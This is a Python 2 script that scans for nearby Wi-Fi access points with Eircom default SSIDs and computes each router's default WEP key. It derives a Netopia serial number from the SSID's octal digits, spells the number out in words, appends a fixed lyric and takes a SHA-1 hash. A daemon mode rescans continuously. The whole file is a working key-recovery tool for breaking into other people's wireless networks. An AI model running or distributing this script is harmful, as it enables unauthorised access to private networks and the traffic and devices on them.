#!/usr/bin/python

import optparse
import os
import re
import sha
import subprocess
import sys
import time

"""Eircom default WEP key autogenerator for Mac OS X and Linux iwtools.

I have subdivided this code too much.

Version 0.4

Heavily based on http://h1.ripway.com/kevindevine/wep_key.html
All credit for the key generation goes to Kevin Devine

"""

__author__ = "nosmo@netsoc.tcd.ie (nosmo)"

intwords = ["Zero","One","Two","Three","Four","Five","Six","Seven","Eight","Nine"]
hendrix = ["Although your world wonders me, ",
           "with your superior cackling hen,",
           "Your people I do not understand,",
           "So to you I shall put an end and"]

SLEEPINTERVAL = 5

def GetAPs(ssid=None):
    """Parse eircom???? ???? SSIDs.

    Args:
     ssid: an optional supplied ssid for getting the key from the command line

    Returns:
      results: a list of two entry lists containing the ocal for the access points
    """

    results = []
    
    if sys.platform == "darwin":
        scanproc = subprocess.Popen(("/System/Library/PrivateFrameworks/Apple80211."
                                     "framework/Versions/Current/Resources/airport "
                                     "-s") , shell = True, stdout = subprocess.PIPE)
        output = scanproc.communicate()[0].split("\n")
        output.pop(0)

        if len(output) == 0:
            sys.stderr.write("No access points detected - This may be because there are no APs or because the airport tool returned too quickly!\n")
            while len(output) == 0:
                scanproc = subprocess.Popen(("/System/Library/PrivateFrameworks/Apple80211."
                                             "framework/Versions/Current/Resources/airport "
                                             "-s") , shell = True, stdout = subprocess.PIPE)
                output = scanproc.communicate()[0].split("\n")

            #sys.exit(1)
        output.pop(len(output) - 1)

        print "Detected the following access points"
        for line in output:
            print ": %s" % line
            line = line.lstrip().split(" ")
            if line[0].startswith("eircom"):
                line[0] = line[0].strip("eircom")
                if re.compile("\d{4}").match(line[1]):
                    results.append([line[0], line[1]])
                else:
                    # Some people seem to be in the odd habit of joining the numbers
                    results.append([line[0]])

    elif sys.platform == "linux2":

        scanproc = subprocess.Popen(("/sbin/iwlist ra0 scanning"),
                                    shell = True, stdout = subprocess.PIPE)
        output = scanproc.communicate()[0].split("\n")
    
        for line in output:
            if line.find("ESSID:") != -1:
                ssid = line.split("\"")[1]
                ssid = ssid.split(" ")
                if ssid[0].startswith("eircom"):
                    ssid[0] = ssid[0].strip("eircom")
                    results.append(ssid)

    elif sys.platform == "ssidonly":

        single = []

        for i in ssid.split(" "):
            if i.startswith("eircom"):
                    i = i.strip("eircom")
            single.append(i)
        results.append(single)

    return results

def ParseOct(instr):
    """Parse the octal numbers from the AP SSIDs

    Args:
      instr: a 4 digit string to be converted to an int representation of the
      octal

    Returns:
      octal: a true integer containing the base-10 representation of the octal
    """
    
    octal = 0
    for digit in instr:
        octal  = (octal << 3) + int(digit)
    return octal

def SerialNumber(ssidoct):
    """Get the serial number form the supplied octal.

    Args:
      ssidoct: the base-10 int obtained from the octal

    Returns:
      serialnumber: the serial number of the access point
    """

    if len(ssidoct) != 2:
        return None

    # XOR the second segment with 0x0FCC (The Netopia MAC prefix)
    mac_segment = ssidoct[1] ^ 0x0FCC

    # Shift the first segment over by 12
    shiftseg = ssidoct[0] << 12

    # 0x01000000 because all Netopia serials start with it
    serial_start = 0x01000000

    fseg = (ssidoct[0] & 0xffffffff) >> (32 - 12)
    
    serialnumber = ((shiftseg | fseg) | mac_segment) + serial_start

    return serialnumber

def SerialString(serial):
    """Return the 'OneTwoThree' string of the serial number

    Args:
      serial: the serial number of the access point

    Returns:
      serialstr: the string of the serial number of the AP
    """
    
    serialno = str(serial)
    serialstr = ""
    for number in serialno: # This is SUPPOSED to iterate over a string
        # Silly pylint nerds
        serialstr += intwords[int(number)]
    return serialstr

def DoAll():

    access_points = GetAPs(optparse.options.ssidonly)

    octalbits = []

    for ap in access_points:

        octconv = []
        for chunk in ap:
            octconv.append(ParseOct(chunk))

        octalbits.append(octconv)
        serial = SerialNumber(octconv)

        if not(serial):
            continue
        else:

            serialstr = SerialString(serial)
            shastr = sha.new(serialstr + hendrix[0])
            shahex = shastr.hexdigest()

            key = ""
            for i in range(26):
                key = key + shahex[i]

            print "eircom%s %s : %s" % (ap[0], ap[1], key)    

def main():
    parser = optparse.OptionParser(usage="Usage: %name [-s|--ssidonly eircomstring] [-d]")

    parser.add_option("-s", "--ssidonly", action="store", type="string",
                     dest="ssidonly", help=("Specifies a manual SSID, no scanning "
                                            "is done (Don't forget double quotes for"
                                            " spaces!"))
    parser.add_option("-d", "--daemon", action="store_true", default=False,
                      dest="daemon", help="Run constantly")

    (optparse.options, optparse.args) = parser.parse_args()

    daemon = False
    if optparse.options.ssidonly:
        sys.platform = "ssidonly"
    elif optparse.options.daemon:
        daemon = True

    if daemon:
        os.system("/usr/bin/clear")
        while True:
            os.system("/usr/bin/clear")
            DoAll()
            time.sleep(SLEEPINTERVAL)
            
    else:
        DoAll()


if __name__ == "__main__":
    main()
